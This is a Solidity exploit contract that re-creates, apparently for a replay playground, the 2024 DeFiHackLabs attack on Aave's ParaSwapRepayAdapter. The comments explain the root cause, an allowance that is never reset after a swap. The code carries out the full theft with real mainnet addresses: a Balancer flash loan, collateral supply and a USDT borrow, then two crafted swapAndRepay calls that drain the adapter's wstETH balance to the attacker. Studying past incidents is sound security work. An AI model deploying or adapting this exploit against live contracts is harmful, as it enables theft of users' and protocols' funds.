// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-08-AAVE_Repay_Adapter).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`AAVERepayAdapterHack`): the test itself is the Balancer flash-loan
// receiver (`receiveFlashLoan`) and the ParaSwap `withdraw()` callee, so there
// is no standalone exploit contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> flashLoan ->
// receiveFlashLoan -> two swapAndRepay calls -> withdraw callback) so the
// playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/AAVE_Repay_Adapter.sol; only ORACLE/POOL (fetched
// dynamically via staticcall in the original setUp()) are hardcoded here from
// the recorded fork values.
//
// Root cause: ParaSwapRepayAdapter's _buyOnParaSwap only resets the
// TokenTransferProxy allowance to 0 BEFORE the swap, never after, and
// validates the swap purely by the adapter's own balance deltas. A crafted
// "swap" that moves 0 of the approved collateral (Call 1) leaves a full
// standing allowance behind; a second call (Call 2) then abuses ParaSwap's
// SimpleSwap router (which allows arbitrary attacker calldata, just not a
// literal transferFrom selector) to pull the adapter's collateral via that
// leftover allowance and hand it to the attacker with a plain transfer().

struct PermitSignature {
    uint256 amount;
    uint256 deadline;
    uint8 v;
    bytes32 r;
    bytes32 s;
}

struct SimpleData {
    address fromToken;
    address toToken;
    uint256 fromAmount;
    uint256 toAmount;
    uint256 expectedAmount;
    address[] callees;
    bytes exchangeData;
    uint256[] startIndexes;
    uint256[] values;
    address payable beneficiary;
    address payable partner;
    uint256 feePercent;
    bytes permit;
    uint256 deadline;
    bytes16 uuid;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IAaveFlashloan {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
}

interface ILendingPool {
    function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IPriceOracleGetter {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IParaswapRepayAdapter {
    function swapAndRepay(
        address collateralAsset,
        address debtAsset,
        uint256 collateralAmount,
        uint256 debtRepayAmount,
        uint256 debtRateMode,
        uint256 buyAllBalanceOffset,
        bytes calldata paraswapData,
        PermitSignature calldata permitSignature
    ) external;
}

contract AAVERepayAdapterExploit {
    address constant LIDOWST = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant PARASWAP_REPAY_ADAPTER = 0x02e7B8511831B1b02d9018215a0f8f500Ea5c6B3;

    address constant AAVE_WBTC_V3 = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address constant AAVE_WSTETH_V3 = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;

    // Fetched dynamically via staticcall in the original test's setUp();
    // hardcoded here from the recorded fork values (block 20,624,703).
    address constant ORACLE = 0x54586bE62E3c3580375aE3723C145253060Ca0C2;
    address constant POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    address constant AUGUSTUS_SWAPPER = 0xDEF171Fe48CF0115B1d80b88dc8eAB59176FEe57;

    // The debtToken minted by Aave when this contract borrows USDT (variableDebtTokenAddress
    // for the USDT reserve at the forked block) — read directly, as the original test does.
    address constant USDT_VARIABLE_DEBT_TOKEN = 0x6df1C1E379bC5a00a7b4C6e67A203333772f45A8;

    // step 0: flash-loan the entire Balancer vault balance of WBTC/wstETH/USDT.
    function run() external {
        uint256 balanceVaultWBTC = IERC20(WBTC).balanceOf(BALANCER_VAULT);
        uint256 balanceVaultLIDOWST = IERC20(LIDOWST).balanceOf(BALANCER_VAULT);
        uint256 balanceVaultUSDT = IERC20(USDT).balanceOf(BALANCER_VAULT);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = balanceVaultWBTC;
        amounts[1] = balanceVaultLIDOWST;
        amounts[2] = balanceVaultUSDT;

        address[] memory tokens = new address[](3);
        tokens[0] = WBTC;
        tokens[1] = LIDOWST;
        tokens[2] = USDT;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        bytes calldata data
    ) external {
        IERC20(WBTC).approve(POOL, amounts[0] + premiums[0]);
        IERC20(LIDOWST).approve(POOL, amounts[1] + premiums[1]);
        IUSDT(USDT).approve(POOL, amounts[2] + premiums[2]);

        uint256 calcBorrowUSDT = _supplyCollateralAndBorrow(amounts[0] + premiums[0], amounts[1] + premiums[1]);

        // Call 1 (prime the lingering allowance): fake "sell" of wstETH where
        // fromToken is actually WETH and fromAmount is 0, so the adapter
        // measures amountSold = 0, re-deposits the collateral, and leaves the
        // wstETH -> TokenTransferProxy allowance standing.
        _swapCall1(calcBorrowUSDT);

        // Call 2 (steal): now abuse the leftover wstETH allowance.
        // collateralAsset is switched to WBTC (amount 1, just to enter the
        // function); the crafted swap's fromToken is wstETH, and the callees
        // pull the adapter's ENTIRE wstETH balance to the attacker via a plain
        // transfer() (not the banned transferFrom), then repay the freshly
        // created USDT debt with the attacker's own funds to pass the
        // "amountReceived >= amountToReceive" check.
        _swapCall2();

        // Withdraw our own supplied wstETH & WBTC back out of Aave, then repay
        // the Balancer flash loan in full.
        ILendingPool(POOL).withdraw(LIDOWST, type(uint256).max, address(this));
        ILendingPool(POOL).withdraw(WBTC, type(uint256).max, address(this));
        for (uint256 i = 0; i < tokens.length; i++) {
            IUSDT(tokens[i]).transfer(BALANCER_VAULT, amounts[i] + premiums[i]);
        }
    }

    // step 1-3: supply flashed WBTC + 2x adapter's wstETH as collateral, then
    // borrow USDT against it to create a real Aave debt (needed so
    // `getDebtRepayAmount` inside the adapter is satisfied).
    function _supplyCollateralAndBorrow(
        uint256 mustRepayWBTC,
        uint256 mustRepayLIDOWST
    ) private returns (uint256 calcBorrowUSDT) {
        IAaveFlashloan pool = IAaveFlashloan(POOL);
        uint256 balanceBeforeLIDOWST = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);

        pool.supply(WBTC, mustRepayWBTC, address(this), 0);
        ILendingPool(POOL).setUserUseReserveAsCollateral(WBTC, true);
        IERC20(AAVE_WBTC_V3).approve(PARASWAP_REPAY_ADAPTER, mustRepayWBTC);

        uint256 someLIDOWSTsupplied = balanceBeforeLIDOWST * 2;
        IERC20(LIDOWST).approve(POOL, someLIDOWSTsupplied);
        pool.supply(LIDOWST, someLIDOWSTsupplied, address(this), 0);

        calcBorrowUSDT = _getBorrowAmount(balanceBeforeLIDOWST);
        uint256 finalBorrowAmount = calcBorrowUSDT + (calcBorrowUSDT / 10);
        require(finalBorrowAmount == 1_776_451_780, "wrong calculation");

        IERC20(AAVE_WSTETH_V3).approve(PARASWAP_REPAY_ADAPTER, mustRepayLIDOWST);
        ILendingPool(POOL).borrow(USDT, finalBorrowAmount, 2, 0, address(this));
    }

    function _swapCall1(uint256 calcBorrowUSDT) private {
        uint256 balanceBeforeLIDOWST = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);

        address[] memory callees = new address[](1);
        callees[0] = address(this);
        bytes memory exchangeData = abi.encodeWithSignature("withdraw(address,uint256)", USDT, calcBorrowUSDT);

        uint256[] memory startIndexes = new uint256[](2);
        startIndexes[0] = 0;
        startIndexes[1] = 68;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes memory buyCallData = abi.encodeWithSelector(
            hex"54e3f31b",
            SimpleData(
                0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // fromToken (WETH, not the real collateral)
                USDT, // toToken
                0, // fromAmount
                calcBorrowUSDT, // toAmount
                calcBorrowUSDT, // expectedAmount
                callees,
                exchangeData,
                startIndexes,
                values,
                payable(PARASWAP_REPAY_ADAPTER), // beneficiary
                payable(address(this)), // partner
                0,
                hex"",
                1_724_819_351,
                bytes16(0)
            )
        );

        IParaswapRepayAdapter(PARASWAP_REPAY_ADAPTER).swapAndRepay(
            LIDOWST,
            USDT,
            balanceBeforeLIDOWST,
            calcBorrowUSDT,
            2,
            0,
            abi.encode(buyCallData, AUGUSTUS_SWAPPER),
            PermitSignature(0, 0, 0, 0, 0)
        );
    }

    function _swapCall2() private {
        uint256 debtUSDT = IERC20(USDT_VARIABLE_DEBT_TOKEN).balanceOf(address(this));
        uint256 lidoWstToSteal = IERC20(LIDOWST).balanceOf(PARASWAP_REPAY_ADAPTER);

        address[] memory callees = new address[](2);
        callees[0] = LIDOWST;
        callees[1] = address(this);
        bytes memory exchangePart1 = abi.encodeWithSignature("transfer(address,uint256)", address(this), lidoWstToSteal);
        bytes memory exchangePart2 = abi.encodeWithSignature("withdraw(address,uint256)", USDT, debtUSDT);
        bytes memory exchangeData = abi.encodePacked(exchangePart1, exchangePart2);

        uint256[] memory startIndexes = new uint256[](3);
        startIndexes[0] = 0;
        startIndexes[1] = 68;
        startIndexes[2] = 136;
        uint256[] memory values = new uint256[](2);
        values[0] = 0;
        values[1] = 0;

        bytes memory buyCallData = abi.encodeWithSelector(
            hex"54e3f31b",
            SimpleData(
                LIDOWST, // fromToken (the real collateral this time)
                USDT, // toToken
                lidoWstToSteal, // fromAmount = the adapter's entire wstETH balance
                debtUSDT, // toAmount
                debtUSDT, // expectedAmount
                callees,
                exchangeData,
                startIndexes,
                values,
                payable(PARASWAP_REPAY_ADAPTER),
                payable(address(this)),
                0,
                hex"",
                1_724_819_351,
                bytes16(0)
            )
        );

        IParaswapRepayAdapter(PARASWAP_REPAY_ADAPTER).swapAndRepay(
            WBTC,
            USDT,
            1,
            debtUSDT,
            2,
            0,
            abi.encode(buyCallData, AUGUSTUS_SWAPPER),
            PermitSignature(0, 0, 0, 0, 0)
        );
    }

    // Gets called twice per attack on a specific token: first time it pays the
    // swapAndRepay using its own funds (no real loss - the attacker is repaying
    // its own artificial debt), second time it is the actual theft leg.
    function withdraw(address user, uint256 withdrawAmount) public {
        IUSDT(user).transfer(msg.sender, withdrawAmount);
    }

    // Calculation from the original PoC: (PriceInUSDT + 30% + 1) + 10% (applied by the caller).
    function _getBorrowAmount(uint256 balanceBeforeLIDOWST) private view returns (uint256) {
        IPriceOracleGetter oracle = IPriceOracleGetter(ORACLE);
        uint256 priceLIDOWST = oracle.getAssetPrice(LIDOWST);
        uint256 priceUSDT = oracle.getAssetPrice(USDT);

        uint256 priceUSDTAdjusted = priceUSDT * 10 ** 6;
        uint256 priceLIDOWSTAdjusted = priceLIDOWST * 10 ** 18;

        uint256 balanceTimesPrice = balanceBeforeLIDOWST * priceLIDOWSTAdjusted;
        uint256 balanceDividedByPrice = balanceTimesPrice / priceUSDTAdjusted;
        uint256 someUSDTborrowed = balanceDividedByPrice * 13_000 / 10_000;

        someUSDTborrowed = someUSDTborrowed / 10 ** (18 + 6);
        someUSDTborrowed += 1; // to avoid rounding errors
        return someUSDTborrowed;
    }
}
